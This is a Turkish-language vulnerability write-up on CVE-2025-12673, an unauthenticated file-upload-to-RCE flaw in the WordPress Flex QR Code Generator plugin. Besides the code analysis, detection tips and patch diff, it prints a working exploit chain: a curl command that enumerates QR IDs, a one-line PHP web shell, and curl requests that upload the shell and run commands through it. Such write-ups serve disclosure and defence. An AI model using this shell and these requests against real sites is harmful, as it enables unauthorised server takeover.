---
title: "CVE: Flex QR Code Generator CVE-2025-12673"
author: b1lal
categories: [CVE, "2025"]
tags: [cve, cve 2025-12673, rce, file upload, wordpress, plugin, wordpress plugin, unauthenticated, research, poc, flex qr code generator, qr code]
render_with_liquid: false
description: "Flex QR Code Generator eklentisinde bulunan CVE-2025-12673 zafiyetini analiz edeceğiz ve nasıl sömürebileceğimizi öğreneceğiz. - Flex QR Code Generator <= 1.2.7 - Unauthenticated Arbitrary File Upload to RCE"
media_subpath: /images/flex_qr_code_generator_cve-2025-12673/
layout: post
published: true  
lang: "tr"
image:
  path: Flex QR.png
  alt: "Wordpress AI Engine CVE-2025-11749"
---

Flex QR Code Generator WordPress eklentisi, sayfalar, ürünler veya gönderiler için özelleştirilmiş QR kodları oluşturmaya yarayan popüler bir araçtır. Ancak, bu eklentide (`<= 1.2.7`) kritik bir güvenlik açığı bulunmaktadır (`CVE-2025-12673`). Bu zafiyet, kimliği doğrulanmamış (unauthenticated) bir saldırganın siteye rastgele dosyalar yüklemesine ve nihayetinde uzaktan kod çalıştırmasına (RCE) olanak tanır. Bu zafiyet araştırmacı <a href="https://www.linkedin.com/in/ryan-kozak/" target="_blank" rel="noopener noreferrer">Ryan Kozak</a> tarafından keşfedilmiştir ve CVSS skoru *9.8 (Kritik)* olarak derecelendirilmiştir.



## Zafiyet Detayları

Sorunun temelinde, eklentinin AJAX isteklerini işleyen `update_qr_code` fonksiyonunun, erişim kontrollerini ve dosya doğrulamasını yapmadan kullanıcıdan gelen veriyi işlemesi yatmaktadır.

Eklenti, QR kodlarını güncellemek için bir AJAX uç noktası kullanır. Ancak geliştiriciler, bu fonksiyonu sadece giriş yapmış kullanıcılar için değil, `wp_ajax_nopriv_flexqr_update_qr` aksiyonunu kullanarak **yetkisiz kullanıcılar** için de kaydetmiştir.

Kritik hata tam da bu noktada başlar, fonksiyon çağırıldığında, kullanıcının yetkisini kontrol etmez ve logo güncellemesiymiş gibi yüklenen dosyanın uzantısını veya türünü doğrulamaz. Bu ihmal, saldırganların `.php` uzantılı zararlı betikleri sunucuya yüklemesine ve çalıştırmasına olanak tanır.

<br>

### Etkilenen Versiyonlar

- **1.2.7** Versiyonu da dahil olmak üzere altında bulunan tüm versiyonlar. *(<= 1.2.7)*

<br>

### Detaylı Teknik Açıklama

Zafiyetin sömürülebilir olması için özel bir ayara gerek yoktur sadece eklentinin aktif olması yeterlidir. Teknik olarak zafiyetin akışını ve kod yapısını inceleyelim.

Aşağıdaki şema, saldırganın isteği ile sunucudaki zafiyetli işlem sürecini özetlemektedir:

![Zafiyet Akış Diyagramı](Flex QR.png)

Zafiyetin kaynağı olan `qr-code-generator.php` dosyasındaki kanca kayıtlarına baktığımızda, `update_qr_code` fonksiyonunun herkese açık olduğunu görüyoruz:

```php
// update qr
[41] add_action('wp_ajax_flexqr_update_qr', [$this, 'update_qr_code']);
[42] add_action('wp_ajax_nopriv_flexqr_update_qr', [$this, 'update_qr_code']);
```

Saldırgan `action=flexqr_update_qr` parametresiyle bu fonksiyonu tetikleyebilmektedir. Peki fonksiyonun içeriği nedir, inceleyelim:

```php
public function update_qr_code() {
    
    // ... Burada yetki kontrolü bulunmamaktadır ...

    // Handle the logo (file upload)
    if (isset($_FILES['logo']) && $_FILES['logo']['error'] === UPLOAD_ERR_OK) {
        $logo = $_FILES['logo'];
        $upload_dir = wp_upload_dir();

        // Get file info and create new filename with ID
        $file_ext = pathinfo($logo['name'], PATHINFO_EXTENSION);
        $file_name = pathinfo($logo['name'], PATHINFO_FILENAME);
        $new_file_name = $file_name . '_' . $qrId . '.' . $file_ext;
        $file_path = $upload_dir['path'] . '/' . $new_file_name;

        if (move_uploaded_file($logo['tmp_name'], $file_path)) {
            $logo_url = $upload_dir['url'] . '/' . $new_file_name;
            $logo_url = str_replace(home_url(), '', $logo_url);
            $update_data['logo_url'] = $logo_url;

            // Delete old logo file if it exists
            if (!empty($existing_qr->logo_url)) {
                $old_logo_path = str_replace($upload_dir['url'], $upload_dir['path'], home_url($existing_qr->logo_url));
                if (file_exists($old_logo_path)) {
                    @unlink($old_logo_path);
                }
            }
        }
    }
}
```

Kod bloğunda görüldüğü üzere, yüklenen dosya için herhangi bir MIME type kontrolü veya uzantı kısıtlaması bulunmamaktadır. Saldırgan **shell.php** adında bir dosya yüklediğinde, sistem bunu kabul eder ve çalıştırılabilir bir PHP dosyası olarak kaydeder.

Ayrıca dosya ismi oluşturulurken saldırganın POST isteğinde gönderdiği **\$qrId** değeri kullanıldığı için:

```php 
$new_file_name = $file_name . '_' . $qrId . '.' . $file_ext; 
```
 
saldırgan yüklediği dosyanın sunucudaki tam adını tahmin etmek zorunda kalmaz, kesin olarak bilebilir.


## Nasıl Sömürülür ?

Zafiyeti sömürmek için saldırganın izlemesi gereken yol haritası:

- Geçerli bir QR ID değeri bulmak 
- Kod çalıştırmak için zararlı bir PHP dosyası hazırlamak 
- AJAX uç noktasına bu yükü göndermek
- Yüklenen dosyayı çalıştırmak

Saldırının başarılı olması için veritabanında kayıtlı geçerli bir **qrId** değerine ihtiyacımız vardır. Çünkü kod, güncelleme işlemine başlamadan önce bu ID'nin varlığını kontrol eder.

```php
$existing_qr = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table_name WHERE id = %d", $qrId));
```

Neyse ki, eklentinin `flexqr_fetch_qr_code` fonksiyonu da kimlik doğrulama kontrolü yapmamaktadır. Aşağıdaki komut ile mevcut QR kodlarını ve ID'lerini listeleyebiliriz:

```php
curl -s -X POST "https://hwkt-local-wp.ddev.site/wp-admin/admin-ajax.php" -d "action=flexqr_fetch_qr_code" -d "per_page=5" -d "page=1" | jq  .
```

Sonuç:

```json
{
  "success": true,
  "data": {
    "qrCodes": [
      {
        "id": "2",
        "qr_name": "Test",
        "text": "B1lal",
        "qr_code_url": null,
        "qr_image_url": "https://hwkt-local-wp.ddev.site/wp-content/uploads/2025/12/qr_code-1.png",
        "tracking": "0",
        "tracking_details": null,
        "qr_data": "{\"width\":300,\"height\":300,\"data\":\"B1lal\",\"image\":\"\",\"margin\":10,\"type\":\"canvas\",\"dotsOptions\":{\"color\":\"#2563eb\",\"type\":\"square\",\"gradient\":{\"type\":\"linear\",\"colorStops\":[{\"offset\":0,\"color\":\"#2563eb\"},{\"offset\":1,\"color\":\"#3b82f6\"}],\"rotation\":45}},\"cornersSquareOptions\":{\"color\":\"#a3e635\",\"type\":\"square\",\"gradient\":{\"type\":\"linear\",\"colorStops\":[{\"offset\":0,\"color\":\"#2563eb\"},{\"offset\":1,\"color\":\"#3b82f6\"}],\"rotation\":45}},\"cornersDotOptions\":{\"color\":\"#3b82f6\",\"type\":\"square\"},\"imageOptions\":{\"imageSize\":0.4,\"margin\":5,\"hideBackgroundDots\":true},\"qrOptions\":{\"typeNumber\":0,\"errorCorrectionLevel\":\"M\"},\"backgroundOptions\":{\"color\":\"#ffffff\"}}",
        "created_at": "2025-12-13 18:24:44",
        "logo_url": null
      },
      {
        "id": "1",
        "qr_name": null,
        "text": "https://example.com",
        "qr_code_url": null,
        "qr_image_url": "https://hwkt-local-wp.ddev.site/wp-content/uploads/2025/12/qr_code.png",
        "tracking": "0",
        "tracking_details": null,
        "qr_data": "{\"data\":\"https://example.com\"}",
        "created_at": "2025-12-13 18:24:40",
        "logo_url": null
      }
    ],
    "totalItems": "2"
  }
}
```

Çıktıdan da gördüğümüz gibi, sistemde **id 1** ve **id 2** mevcuttur. Saldırımızda **qrId=1** değerini kullanacağız.

<blockquote class="prompt-info"><p>Bu şekilde yapmak yerine doğrudan 1,2,3 gibi değerler de verebiliriz. Muhtelemen eklenti kurulum yapıldıktan sonra qr code üretme denemesi yapılmıştır.</p>
</blockquote>

Şimdi zararlı bir PHP dosyası oluşturalım. Örnek olarak basit bir web shell kullanabiliriz:

```php
<?php system($_GET["s3cr3t_param"]); ?>
```

```bash
echo '<?php system($_GET["s3cr3t_param"]); ?>' > shell.php
```

Gerekli ID bilgisini aldık ve dosyamızda hazır. Şimdi, **flexqr_update_qr** işlemini hedefleyen ve zafiyeti sömüren asıl saldırı isteğini gönderiyoruz.

Burada **action**, **qrId** ve **qrData** parametrelerini gönderirken, **logo** parametresine zararlı dosyamızı ekliyoruz:

```bash
curl -i -X POST "https://hwkt-local-wp.ddev.site/wp-admin/admin-ajax.php" -F "action=flexqr_update_qr" -F "qrId=1" -F "qrData={\"data\":\"https://example.com\"}" -F "logo=@shell.php"
```

Sonuç:

```http
HTTP/2 200

...

{"success":true,"data":{"message":"QR code updated successfully.","id":1,"finalUrl":"https:\/\/example.com"}}
```

Sunucudan dönen yanıt, işlemin başarılı olduğunu doğrulamaktadır.

Kodun çalışma mantığı gereği, yüklenen dosya şu formatta yeniden isimlendirilir: **DOSYAADI** + _ + **QRID** + **UZANTI**
Biz `shell.php` dosyasını `qrId=1` parametresi ile yüklediğimiz için, dosyanın yeni adı kesin olarak `shell_1.php` olacaktır. Dosya, WordPress'in o anki yıl/ay yükleme dizinine kaydedilir.

Artık oluşturduğumuz web shell üzerinden komut çalıştırabiliriz.


```bash
curl -s "https://hwkt-local-wp.ddev.site/wp-content/uploads/2025/12/shell_1.php?s3cr3t_param=whoami"
```

Buradan sonrası saldırganın yeteneklerine bağlıdır; tüm siteyi ele geçirebilir, veritabanını silebilir veya arka kapı bırakabilir.


## Tespit 

Sitenizin bu zafiyet için hedef alınıp alınmadığını kontrol etmek için sunucu erişim günlüklerini inceleyebilirsiniz.

- **admin-ajax.php** dosyasına yapılan POST isteklerini filtreleyin ve **action=flexqr_update_qr** parametresini arayın. Eğer bu istek giriş yapmamış bir IP adresinden geliyorsa, saldırı girişimi olabilir.
  
- **/wp-content/uploads/** dizininde son zamanlarda oluşturulmuş **.php** uzantılı dosyaları arayın. Özellikle dosya adının sonunda **_1.php, _2.php** gibi sayılar olan şüpheli dosyalar saldırı göstergesidir.



<br>

## Önlem ve Güncelleme


Eklentinin geliştiricisi, bu açığı **1.2.8** sürümünde yamalamıştır. Eklentinin derhal **1.2.8** sürümüne güncellenmesi gerekmektedir.


Yama ile birlikte kodda yapılan değişikliklere baktığımızda, artık **check_admin_capability()** ile yetki kontrolü yapıldığını, **verify_nonce()** ile güvenliğin sağlandığını ve dosya yüklemelerinde sadece resim dosyalarına (jpg, png, gif vb.) izin verildiğini görüyoruz.


```php
+  private function check_admin_capability()
+  {
+    // Capability Check: User must be logged in and capable of managing options (Admin/Editor).
+    if (!is_user_logged_in() || !current_user_can('manage_options')) {
+      // Send a 403 Forbidden response.
+      wp_send_json_error(['message' => 'Unauthorized access. You do not have permission.'], 403);
+      wp_die();
+    }
+  }
+
+  private function verify_nonce($action)
+  {
+    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], $action)) {
+      wp_send_json_error(['message' => 'Security check failed. Nonce is missing or invalid.'], 403);
+      wp_die();
+    }
+  }
+
```

```php
+      // === 3. SECURE FILE UPLOAD HANDLING ===
+      require_once(ABSPATH . 'wp-admin/includes/file.php');
+
+      // Restrict to image files ONLY
+      $allowed_mimes = [
+        'jpg|jpeg|jpe' => 'image/jpeg',
+        'png' => 'image/png',
+        'gif' => 'image/gif',
+        'webp' => 'image/webp',
+        'svg' => 'image/svg+xml',
+      ];
+
+      $upload_overrides = [
+        'test_form' => false,
+        'mimes' => $allowed_mimes,
+      ];

+      ...
```


## Referanslar


- <a href="https://plugins.trac.wordpress.org/changeset?old_path=%2Fflex-qr-code-generator%2Ftrunk&old=3399133&new_path=%2Fflex-qr-code-generator%2Ftrunk&new=3412218&sfp_email=&sfph_mail=#file9" target="_blank" rel="noopener noreferrer">Plugins Trac Wordpress</a>
- <a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/flex-qr-code-generator/flex-qr-code-generator-126-unauthenticated-arbitrary-file-upload" target="_blank" rel="noopener noreferrer">Flex QR Code Generator <= 1.2.7 - Unauthenticated Arbitrary File Upload</a>
- <a href="https://ryankozak.com/" target="_blank" rel="noopener noreferrer">Ryan Kozak</a>

<br>

<p style="font-weight:900; color: gray; font-size: 50px; text-align:center;">Teşekkürler <a href="https://www.linkedin.com/in/batuhan0/?lipi=urn%3Ali%3Apage%3Ad_flagship3_search_srp_people%3BLUebMIsyT%2Fy0mhB736RysA%3D%3D" target="_blank" rel="noopener noreferrer">@batuhaner</a><p>

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
  white-space: pre-wrap;
}

.post-desc {
  font-family: 'Open Sans', sans-serif !important;
}

</style>
